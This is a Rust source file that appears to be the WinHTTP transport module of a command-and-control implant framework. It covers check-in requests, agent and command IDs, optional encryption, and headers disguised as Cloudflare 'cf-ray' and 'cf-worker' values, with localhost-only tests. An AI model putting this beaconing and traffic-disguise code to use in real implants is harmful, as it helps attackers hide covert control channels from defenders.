use alloc::string::String;
use alloc::sync::Arc;
use anyhow::Result;
use bytes::{BufMut, Bytes, BytesMut};
use serde::de::DeserializeOwned;
use serde::Serialize;

use rs2_communication_protocol::magic_numbers;
use rs2_communication_protocol::metadata::{Metadata, WithMetadata};
use rs2_communication_protocol::protocol::Protocol;
use rs2_communication_protocol::sender::Sender;
use rs2_crypt::encryption_algorithm::EncryptionAlgorithm;

use crate::client::WinHttpClient;

/// Define the WinHTTP protocol for sending and receiving data.
pub struct WinHttpProtocol<E>
where
    E: EncryptionAlgorithm,
{
    /// The WinHTTP client used to send requests.
    /// This client maintains session and connection handles for efficient reuse across requests.
    client: WinHttpClient,
    /// A flag indicating whether the protocol is used for checkin.
    /// This is used to determine whether the checkin endpoint should be appended to the URL.
    /// It's automatically reset to false after each request.
    is_checkin: bool,
    /// The base URL for the protocol. This is the URL to which requests are sent.
    base_url: String,
    /// The global encryptor used to encrypt and decrypt data.
    /// This is used only if an encryptor is not provided when sending or receiving data.
    /// If no encryptor is provided, the global encryptor is used to encrypt and decrypt data as a fallback;
    /// if the global encryptor is not set, data is sent and received without encryption.
    global_encryptor: Option<E>,
}

impl<E> WinHttpProtocol<E>
where
    E: EncryptionAlgorithm,
{
    /// Create a new WinHTTP protocol.
    pub fn new(base_url: String) -> Self {
        WinHttpProtocol {
            client: WinHttpClient::new(),
            is_checkin: false,
            base_url,
            global_encryptor: None,
        }
    }

    /// Set the global encryptor used to encrypt and decrypt data.
    pub fn set_global_encryptor(&mut self, encryptor: Option<E>) -> &Self {
        self.global_encryptor = encryptor;
        self
    }

    /// Get the encryptor to use for encryption or decryption, falling back to the global encryptor
    /// if necessary.
    fn encryptor_or_global(&self, encryptor: Option<E>) -> Option<E> {
        encryptor.or(self.global_encryptor.clone())
    }
}

impl<E> Sender for WinHttpProtocol<E>
where
    E: EncryptionAlgorithm,
{
    fn set_is_checkin(&mut self, is_checkin: bool) -> &Self {
        self.is_checkin = is_checkin;
        self
    }

    async fn send(&mut self, data: Bytes, metadata: Arc<Metadata>) -> Result<Bytes> {
        let mut url = self.base_url.clone();

        // Ensure the URL ends with a slash.
        if !url.ends_with('/') {
            url.push('/');
        }

        // Append the checkin endpoint to the URL if necessary.
        if self.is_checkin {
            url.push_str("checkin/");
        }

        // Append the path to the URL if it is provided.
        if let Some(ref path) = metadata.path {
            url.push_str(&path);
        }

        // Reset the checkin flag after each request, here the request has not been sent yet but
        // the flag is reset to avoid it being set for the next request in case of errors.
        self.set_is_checkin(false);

        // Send the request using the WinHTTP client.
        let response = self.client.post(&url, data.to_vec(), metadata).await?;
        Ok(response)
    }
}

impl<E> Protocol<E> for WinHttpProtocol<E>
where
    E: EncryptionAlgorithm + Send,
{
    fn read<S>(&self, data: Bytes, encryptor: Option<E>) -> Result<S>
    where
        S: DeserializeOwned,
    {
        // Use the global encryptor if an encryptor is not provided.
        let encryptor = self.encryptor_or_global(encryptor);

        // Decrypt the data if an encryptor is provided.
        let data = if let Some(encryptor) = encryptor {
            encryptor.decrypt(Bytes::from(data), None)?
        } else {
            data
        };

        if data.len() < magic_numbers::JSON.len() {
            return Err(anyhow::anyhow!("Invalid data length"));
        }

        // Check if the magic number is correct.
        if data[..magic_numbers::JSON.len()] != magic_numbers::JSON {
            return Err(anyhow::anyhow!("Invalid magic number"));
        }

        serde_json::from_slice(data.get(magic_numbers::JSON.len()..).unwrap()).map_err(|e| e.into())

        // serde_json::from_slice(data.get(0..).unwrap()).map_err(|e| e.into())
    }

    async fn write<D>(&mut self, data: D, encryptor: Option<E>) -> Result<Bytes>
    where
        D: Serialize + WithMetadata + Send,
    {
        let metadata = data.get_metadata();

        let serialized = serde_json::to_string(&data)?;
        let data_length = serialized.len() + magic_numbers::JSON.len();
        let mut data = BytesMut::with_capacity(data_length);

        // Write the magic number and the serialized data to the buffer.
        for byte in magic_numbers::JSON.iter() {
            data.put_u8(*byte);
        }
        data.put(serialized.as_bytes());

        let data = data.freeze();
        let data = {
            // Use the global encryptor if an encryptor is not provided.
            let mut encryptor = self.encryptor_or_global(encryptor);

            // Encrypt the data if an encryptor is provided.
            let data = if let Some(encryptor) = encryptor.as_mut() {
                encryptor.encrypt(data)?
            } else {
                data
            };

            data
        };

        self.send(data, metadata).await
    }
}

#[cfg(test)]
mod tests {
    use alloc::string::ToString;
    use axum::http::HeaderMap;
    use axum::routing::get;
    use axum::Router;
    use serde::Deserialize;
    use tokio::select;
    use tokio_util::sync::CancellationToken;

    use super::*;
    use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;

    async fn make_dummy_server(cancellation_token: CancellationToken, router: Router<()>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:8080")
            .await
            .unwrap();

        axum::serve(listener, router)
            .with_graceful_shutdown(async move {
                select! {
                    _ = cancellation_token.cancelled() => {},
                }
            })
            .await
            .unwrap();
    }

    #[derive(Serialize, Deserialize, Debug)]
    struct SampleData {
        foo: String,
    }

    impl WithMetadata for SampleData {
        fn get_metadata(&self) -> Arc<Metadata> {
            Arc::new(Metadata {
                request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
                command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
                agent_id: "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
                path: None,
            })
        }
    }

    #[test]
    fn test_read() {
        let encryptor = IdentEncryptor;
        let protocol = WinHttpProtocol::new("http://localhost:8080".to_string());

        let mut check = BytesMut::new();
        for i in magic_numbers::JSON.iter() {
            check.put_u8(*i);
        }
        for i in "{\"foo\":\"bar\"}".as_bytes() {
            check.put_u8(*i);
        }
        let data = check.freeze();
        let result = protocol.read::<SampleData>(data, Some(encryptor));
        assert!(result.is_ok());
        let value = result.unwrap();
        assert_eq!(value.foo, "bar");
    }

    #[tokio::test]
    async fn test_write() {
        let cancellation_token = CancellationToken::new();
        let handler = |headers: HeaderMap, body: Bytes| async move {
            assert_eq!(headers.get("content-type").unwrap(), "text/plain");
            assert_eq!(
                headers.get("cf-ray").unwrap(),
                "an3a8hlnrr4638d30yef0oz5sncjdx5v.an3a8hlnrr4638d30yef0oz5sncjdx5x"
            );
            assert_eq!(
                headers.get("cf-worker").unwrap(),
                "an3a8hlnrr4638d30yef0oz5sncjdx5w"
            );

            let mut check = BytesMut::new();
            for i in magic_numbers::JSON.iter() {
                check.put_u8(*i);
            }
            for i in "{\"foo\":\"bar\"}".as_bytes() {
                check.put_u8(*i);
            }

            assert_eq!(body, check.freeze());
            "Ok"
        };
        let router = Router::new().route("/", get(handler).post(handler));

        let call = make_dummy_server(cancellation_token.clone(), router);
        let server_handle = tokio::spawn(async move {
            call.await;
        });

        let encryptor = IdentEncryptor;
        let mut protocol = WinHttpProtocol::new("http://localhost:8080".to_string());
        let data = SampleData {
            foo: "bar".to_string(),
        };

        let _result = protocol.write(data, Some(encryptor)).await;

        cancellation_token.cancel();
        server_handle.await.unwrap();
    }
}
